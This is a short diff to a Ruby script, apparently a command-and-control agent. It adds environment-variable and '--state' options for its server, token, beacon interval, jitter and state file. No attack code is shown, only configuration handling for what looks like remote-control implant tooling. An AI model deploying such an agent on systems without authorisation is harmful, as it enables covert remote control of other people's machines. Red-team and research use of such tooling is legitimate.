@@ -20,7 +20,7 @@ require 'open3'
 
 SHELL_TIMEOUT = 120
 OUTPUT_LIMIT  = 12000
-$STATE_FILE   = File.join(Dir.home, '.c2agent.json')
+$STATE_FILE   = ENV['C2_STATE_FILE'] || File.join(Dir.home, '.c2agent.json')
 $windows      = !!(RUBY_PLATFORM =~ /mswin|mingw|cygwin/)
 
 # ---------------------------------------------------------------- globals
@@ -28,9 +28,9 @@ $windows      = !!(RUBY_PLATFORM =~ /mswin|mingw|cygwin/)
 $server   = ''
 $token    = ''
 $agent_id = ''
-$interval = 10
-$jitter   = 0
-$verbose  = false
+$interval = (ENV['C2_INTERVAL'] || 10).to_i
+$jitter   = (ENV['C2_JITTER']   || 0).to_i
+$verbose  = %w[1 true].include?(ENV['C2_VERBOSE'])
 $clone_watchers = {}
 
 # ---------------------------------------------------------------- helpers
@@ -1058,7 +1058,7 @@ end
 # ----------------------------------------------------------------- main
 
 OptionParser.new do |opts|
-  opts.banner = "usage: ruby agent.rb --server URL --token TOKEN [options]"
+  opts.banner = "usage: ruby agent.rb --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]"
   opts.on('--server URL')    { |v| $server = v }
   opts.on('--token TOKEN')   { |v| $token = v }
   opts.on('--interval N')    { |v| $interval = v.to_i }
@@ -1071,7 +1071,7 @@ $server = ENV['C2_SERVER'] || '' if $server.empty?
 $token  = ENV['C2_TOKEN']  || '' if $token.empty?
 
 if $server.empty? || $token.empty?
-  $stderr.puts "usage: ruby agent.rb --server URL --token TOKEN [--interval N] [--jitter N] [--verbose]"
+  $stderr.puts "usage: ruby agent.rb --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]"
   exit(1)
 end
 $server = $server.chomp('/')
